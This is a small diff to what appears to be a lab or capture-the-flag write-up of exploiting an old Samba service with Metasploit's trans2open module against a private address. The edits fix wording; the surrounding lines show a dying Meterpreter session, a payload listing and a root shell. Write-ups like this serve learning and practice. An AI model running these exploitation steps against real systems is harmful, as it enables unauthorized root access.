@@ -455,12 +455,12 @@ msf exploit(linux/samba/trans2open) > run
 [*] 10.101.85.11 - Meterpreter session 4 closed.  Reason: Died
 ```
 
-i need to look other payload.
+look other payload.
 ```
 show payloads
 ```
 
-i think i need to use more stably payload because the service is very old.
+i decided to use a more stable payload because the target service is quite old.
 
 ```
 msf exploit(linux/samba/trans2open) > show payloads
@@ -554,3 +554,5 @@ uid=0(root) gid=0(root) groups=99(nobody)
 whoami
 root
 ```
+
+now i'm root.
